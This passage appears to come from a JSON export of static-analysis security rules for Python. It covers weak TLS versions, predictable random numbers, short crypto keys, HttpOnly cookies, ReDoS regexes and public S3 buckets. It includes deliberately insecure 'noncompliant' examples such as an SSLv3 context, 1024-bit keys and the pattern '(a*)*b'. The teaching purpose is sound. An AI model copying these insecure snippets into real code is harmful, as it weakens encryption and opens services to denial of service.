        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Python Standard Library</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"noncompliant\">\nimport ssl\n\nssl.SSLContext(ssl.PROTOCOL_SSLv3) # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"compliant\">\nimport ssl\n\ncontext = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\ncontext.minimum_version = ssl.TLSVersion.TLSv1_2\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S2245": {
        "name": "Using pseudorandom number generators (PRNGs) is security-sensitive",
        "htmlDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Only use random number generators which are <a\n  href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#secure-random-number-generation\">recommended by\n  OWASP</a> or any other trusted organization. </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport random\n\nrandom.getrandbits(1) # Sensitive\nrandom.randint(0,9) # Sensitive\nrandom.random()  # Sensitive\n\n# the following functions are sadly used to generate salt by selecting characters in a string ex: \"abcdefghijk\"...\nrandom.sample(['a', 'b'], 1)  # Sensitive\nrandom.choice(['a', 'b'])  # Sensitive\nrandom.choices(['a', 'b'])  # Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/338\">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/330\">CWE-330 - Use of Insufficiently Random Values</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1241\">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S4426": {
        "name": "Cryptographic key generation should be based on strong parameters",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>\n<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>\n<ul>\n  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>\n  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.\n    <ul>\n      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key\n      Derivation Function 2) </li>\n    </ul>  </li>\n</ul>\n<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at\nthe plaintext.</p>\n<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this\ndata after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in pyca</h2>\n<h3>Code examples</h3>\n<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the\nalgorithm.</p>\n<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,\na 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>\n<h4>Noncompliant code example</h4>\n<p>Here is an example of a private key generation with RSA:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.backends import default_backend\n\nbackend = default_backend()\n\nprivate_key = rsa.generate_private_key(key_size = 1024, backend = backend) # Noncompliant\npublic_key  = private_key.public_key()\n</pre>\n<p>Here is an example of a key generation with the Digital Signature Algorithm (DSA):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nfrom cryptography.hazmat.primitives.asymmetric import dsa\nfrom cryptography.hazmat.backends import default_backend\n\nbackend = default_backend()\n\nprivate_key = dsa.generate_private_key(key_size = 1024, backend = backend) # Noncompliant\npublic_key  = private_key.public_key()\n</pre>\n<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve\nname:</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nfrom cryptography.hazmat.primitives.asymmetric import ec\nfrom cryptography.hazmat.backends import default_backend\n\nbackend = default_backend()\n\nprivate_key = ec.generate_private_key(curve=ec.SECT163R2(), backend=backend)  # Noncompliant\npublic_key  = private_key.public_key()\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.backends import default_backend\n\nbackend = default_backend()\n\nprivate_key = rsa.generate_private_key(key_size = 3072, backend = backend)\npublic_key  = private_key.public_key()\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nfrom cryptography.hazmat.primitives.asymmetric import dsa\nfrom cryptography.hazmat.backends import default_backend\n\nbackend = default_backend()\n\nprivate_key = dsa.generate_private_key(key_size = 3072, backend = backend)\npublic_key  = private_key.public_key()\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nfrom cryptography.hazmat.primitives.asymmetric import ec\nfrom cryptography.hazmat.backends import default_backend\n\nbackend = default_backend()\n\nprivate_key = ec.generate_private_key(curve=ec.SECP521R1(), backend=backend)\npublic_key  = private_key.public_key()\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>\n<p>The appropriate choices are the following.</p>\n<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>\n<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>\n<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of\n<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>\n<h4>AES (Advanced Encryption Standard)</h4>\n<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying\nall possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.\nTherefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>\n<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>\n<h4>Elliptic Curve Cryptography (ECC)</h4>\n<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve\nalgorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>\n<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>\n<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve\nparameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves\ncurrently include:</p>\n<ul>\n  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>\n  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>\n  <li> Curve448. </li>\n  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>\n</ul>\n<h3>Going the extra mile</h3>\n<h4>Pre-Quantum Cryptography</h4>\n<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep\nin mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or\n\"post-quantum\") counterpart.</p>\n<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>\n<p><a href=\"https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation\">Learn more here</a>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> Documentation\n    <ul>\n      <li> NIST Documentation - <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf\">NIST SP 800-186: Recommendations\n      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>\n      <li> IETF - <a href=\"https://datatracker.ietf.org/doc/html/rfc5639\">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and\n      Curve Generation</a> </li>\n    </ul>  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S3330": {
        "name": "Creating cookies without the \"HttpOnly\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will\nbe able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer\nto decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target\nthe theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS\nvulnerability to steal session-cookies.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>\n  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)\n  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /\n  sensitive-security cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Flask:</p>\n<pre>\nfrom flask import Response\n\n@app.route('/')\ndef index():\n    response = Response()\n    response.set_cookie('key', 'value') # Sensitive\n    return response\n</pre>\n<h2>Compliant Solution</h2>\n<p>Flask:</p>\n<pre>\nfrom flask import Response\n\n@app.route('/')\ndef index():\n    response = Response()\n    response.set_cookie('key', 'value', httponly=True) # Compliant\n    return response\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/HttpOnly\">OWASP HttpOnly</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1004\">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE\">HTTPONLY_COOKIE</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "python:S4784": {
        "name": "Using regular expressions is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=python%3AS5852'>S5852</a>, <a href='/coding_rules#rule_key=pythonsecurity%3AS2631'>S2631</a> instead.</p>\n<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021\">CVE-2017-16021</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863\">CVE-2018-13863</a> </li>\n</ul>\n<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as\n<code>(a+)+s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with\nevery additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular\nexpression, <code>a+s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>\n<p>Evaluating such regular expressions opens the door to <a\nhref=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">Regular expression Denial of Service (ReDoS)</a> attacks.\nIn the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making\nthe service inaccessible to genuine users.</p>\n<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following\ncharacters: <code>*+{</code>.</p>\n<p>Example: <code>(a+)*</code></p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li>\n  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for\nvulnerability reports mentioning the one engine you’re are using.</p>\n<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href=\"https://github.com/google/re2\">Google Re2</a>.</p>\n<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>\n<h2>Sensitive Code Example</h2>\n<p>Django</p>\n<pre>\nfrom django.core.validators import RegexValidator\nfrom django.urls import re_path\n\nRegexValidator('(a*)*b')  # Sensitive\n\ndef define_http_endpoint(view):\n    re_path(r'^(a*)*b/$', view)  # Sensitive\n</pre>\n<p><code>re</code> module</p>\n<pre>\nimport re\nfrom re import compile, match, search, fullmatch, split, findall, finditer, sub, subn\n\n\ninput = 'input string'\nreplacement = 'replacement'\n\nre.compile('(a*)*b')  # Sensitive\nre.match('(a*)*b', input)  # Sensitive\nre.search('(a*)*b', input)  # Sensitive\nre.fullmatch('(a*)*b', input)  # Sensitive\nre.split('(a*)*b', input)  # Sensitive\nre.findall('(a*)*b', input)  # Sensitive\nre.finditer('(a*)*b',input)  # Sensitive\nre.sub('(a*)*b', replacement, input)  # Sensitive\nre.subn('(a*)*b', replacement, input)  # Sensitive\n</pre>\n<p><code>regex</code> module</p>\n<pre>\nimport regex\nfrom regex import compile, match, search, fullmatch, split, findall, finditer, sub, subn, subf, subfn, splititer\n\ninput = 'input string'\nreplacement = 'replacement'\n\nregex.subf('(a*)*b', replacement, input)  # Sensitive\nregex.subfn('(a*)*b', replacement, input)  # Sensitive\nregex.splititer('(a*)*b', input)  # Sensitive\n\nregex.compile('(a*)*b')  # Sensitive\nregex.match('(a*)*b', input)  # Sensitive\nregex.search('(a*)*b', input)  # Sensitive\nregex.fullmatch('(a*)*b', input)  # Sensitive\nregex.split('(a*)*b', input)  # Sensitive\nregex.findall('(a*)*b', input)  # Sensitive\nregex.finditer('(a*)*b',input)  # Sensitive\nregex.sub('(a*)*b', replacement, input)  # Sensitive\nregex.subn('(a*)*b', replacement, input)  # Sensitive\n</pre>\n<h2>Exceptions</h2>\n<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)+</code>,\n<code>(a|a?)+</code>.</p>\n<p>It is a good idea to test your regular expression if it has the same pattern on both side of a \"<code>|</code>\".</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS\">CWE-624 - Executable Regular Expression\n  Error</a> </li>\n  <li> OWASP Regular expression Denial of Service - ReDoS </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S6281": {
        "name": "Allowing public ACLs or policies on a S3 bucket is security-sensitive",
        "htmlDesc": "<p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>\n<p>This access control can be relaxed with ACLs or policies.</p>\n<p>To prevent permissive policies to be set on a S3 bucket the following booleans settings can be enabled:</p>\n<ul>\n  <li> <code>block_public_acls</code>: to block or not public ACLs to be set to the S3 bucket. </li>\n  <li> <code>ignore_public_acls</code>: to consider or not existing public ACLs set to the S3 bucket. </li>\n  <li> <code>block_public_policy</code>: to block or not public policies to be set to the S3 bucket. </li>\n  <li> <code>restrict_public_buckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket\n  owner account. </li>\n</ul>\n<p>The other attribute <code>BlockPublicAccess.BLOCK_ACLS</code> only turns on <code>block_public_acls</code> and <code>ignore_public_acls</code>. The\npublic policies can still affect the S3 bucket.</p>\n<p>However, all of those options can be enabled by setting the <code>block_public_access</code> property of the S3 bucket to\n<code>BlockPublicAccess.BLOCK_ALL</code>.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive data. </li>\n  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>\n  <li> Many users have the permission to set ACL or policy to the S3 bucket. </li>\n  <li> These settings are not already enforced to true at the account level. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to configure:</p>\n<ul>\n  <li> <code>block_public_acls</code> to <code>True</code> to block new attempts to set public ACLs. </li>\n  <li> <code>ignore_public_acls</code> to <code>True</code> to block existing public ACLs. </li>\n  <li> <code>block_public_policy</code> to <code>True</code> to block new attempts to set public policies. </li>\n  <li> <code>restrict_public_buckets</code> to <code>True</code> to restrict existing public policies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>By default, when not set, the <code>block_public_access</code> is fully deactivated (nothing is blocked):</p>\n<pre>\nbucket = s3.Bucket(self,\n    \"bucket\"        # Sensitive\n)\n</pre>\n<p>This <code>block_public_access</code> allows public ACL to be set:</p>\n<pre>\nbucket = s3.Bucket(self,\n    \"bucket\",\n    block_public_access=s3.BlockPublicAccess(\n        block_public_acls=False,       # Sensitive\n        ignore_public_acls=True,\n        block_public_policy=True,\n        restrict_public_buckets=True\n    )\n)\n</pre>\n<p>The attribute <code>BLOCK_ACLS</code> only blocks and ignores public ACLs:</p>\n<pre>\nbucket = s3.Bucket(self,\n    \"bucket\",\n    block_public_access=s3.BlockPublicAccess.BLOCK_ACLS     # Sensitive\n)\n</pre>\n<h2>Compliant Solution</h2>\n<p>This <code>block_public_access</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public policies:</p>\n<pre>\nbucket = s3.Bucket(self,\n    \"bucket\",\n    block_public_access=s3.BlockPublicAccess.BLOCK_ALL # Compliant\n)\n</pre>\n<p>A similar configuration to the one above can obtained by setting all parameters of the <code>block_public_access</code></p>\n<pre>\nbucket = s3.Bucket(self, \"bucket\",\n    block_public_access=s3.BlockPublicAccess(       # Compliant\n        block_public_acls=True,\n        ignore_public_acls=True,\n        